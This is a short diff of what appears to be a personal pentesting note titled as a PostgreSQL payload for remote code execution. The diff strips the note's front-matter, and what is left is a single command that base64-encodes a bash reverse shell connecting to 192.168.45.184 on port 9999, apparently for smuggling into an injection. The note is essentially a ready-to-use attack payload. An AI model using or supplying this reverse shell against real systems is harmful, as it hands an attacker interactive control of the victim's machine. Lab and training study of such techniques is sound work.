@@ -1,20 +1,3 @@
----
-{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/postgres-sql/psql-payload-rce/","noteIcon":"","created":"2025-04-15T14:11:19.611-04:00"}
----
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ```
 
 echo -n 'bash -i >& /dev/tcp/192.168.45.184/9999 0>&1' | base64
